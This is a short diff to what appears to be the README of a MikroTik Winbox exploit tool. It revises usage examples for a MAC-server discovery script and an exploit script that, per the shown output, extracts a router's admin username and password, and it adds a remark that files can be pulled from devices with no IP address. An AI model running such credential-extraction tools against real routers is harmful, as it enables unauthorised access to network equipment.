@@ -16,9 +16,10 @@ Pass: Th3P4ssWord
 
 ```  
 
-MAC server Winbox (Layer 2)
+MAC server Winbox (Layer 2)  
+You can extract files even if the device doesn't have an IP address :-)
 ```
-$ sudo python3 MACServerDiscover.py
+$ python3 MACServerDiscover.py
 Looking for Mikrotik devices (MAC servers)
 
     aa:bb:cc:dd:ee:ff 
@@ -27,7 +28,7 @@ Looking for Mikrotik devices (MAC servers)
 
 ```
 ```
-$ sudo python3 MACServerExploit.py aa:bb:cc:dd:ee:ff
+$ python3 MACServerExploit.py aa:bb:cc:dd:ee:ff
 
 User: admin
 Pass: Th3P4ssWord
